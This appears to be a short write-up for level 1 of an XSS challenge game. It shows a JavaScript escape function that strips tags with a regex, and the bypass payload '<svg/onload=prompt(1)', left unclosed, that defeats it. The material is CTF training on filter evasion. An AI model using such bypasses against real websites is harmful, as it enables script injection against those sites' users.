Level 1:

function escape(input) {
    // tags stripping mechanism from ExtJS library
    // Ext.util.Format.stripTags
    var stripTagsRE = /<\/?[^>]+>/gi;
    input = input.replace(stripTagsRE, '');

    return '<article>' + input + '</article>';
}


Solution:- 


Note:- If you think to use <script><prompt(1)</script>, then it won't work because <script> is not allowed to work with this level.


For this level, You have to use <svg>

Ans-    <svg/onload=prompt(1)  and don't forget to click spacebar after using the command.
